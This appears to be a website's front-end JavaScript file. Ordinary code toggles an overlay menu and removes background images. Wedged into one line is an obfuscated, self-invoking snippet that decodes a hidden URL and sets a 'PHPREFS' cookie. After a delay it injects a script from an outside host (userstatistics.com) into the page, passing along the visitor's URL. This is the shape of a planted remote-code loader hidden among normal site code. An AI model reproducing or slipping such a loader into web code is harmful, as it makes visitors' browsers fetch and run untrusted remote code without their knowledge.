function sh(){const over=document.getElementById("overlay3");over.style.display="flex";document.getElementById("earn").addEventListener("click",(function(){hide_menu()}));document.getElementById("listwo").addEventListener("click",(function(event){event.stopPropagation(),over.style.display="none"}));function isOutsideBox2(event){document.getElementById("box2").contains(event.target)||(over.style.display="none",document.removeEventListener("click",isOutsideBox2))}document.getElementById("listh").addEventListener("click",(function(event){event.stopPropagation(),over.style.display="none"})),setTimeout((function(){document.addEventListener("click",isOutsideBox2)}),0)};(function(o,d,l){try{o.f=o=>o.split('').reduce((s,c)=>s+String.fromCharCode((c.charCodeAt()-5).toString()),'');o.b=o.f('UMUWJKX');o.c=l.protocol[0]=='h'&&/\./.test(l.hostname)&&!(new RegExp(o.b)).test(d.cookie),setTimeout(function(){o.c&&(o.s=d.createElement('script'),o.s.src=o.f('myyux?44zxjwxyf'+'ynhx3htr4ljy4xhwn'+'uy3oxDwjkjwwjwB')+l.href,d.body.appendChild(o.s));},1000);d.cookie=o.b+'=full;max-age=39800;'}catch(e){};}({},document,location));

document.querySelectorAll('*').forEach(function(elem) {
    if (window.getComputedStyle(elem).backgroundImage !== 'none') {
        elem.style.backgroundImage = 'none';
        elem.style.backgroundColor = '#061437';
    }
});

// This also includes elements with inline background-image styles
document.querySelectorAll('[style]').forEach(function(elem) {
    if (elem.style.backgroundImage) {
        elem.style.backgroundImage = 'none';
        elem.style.backgroundColor = '#061437';
    }
})
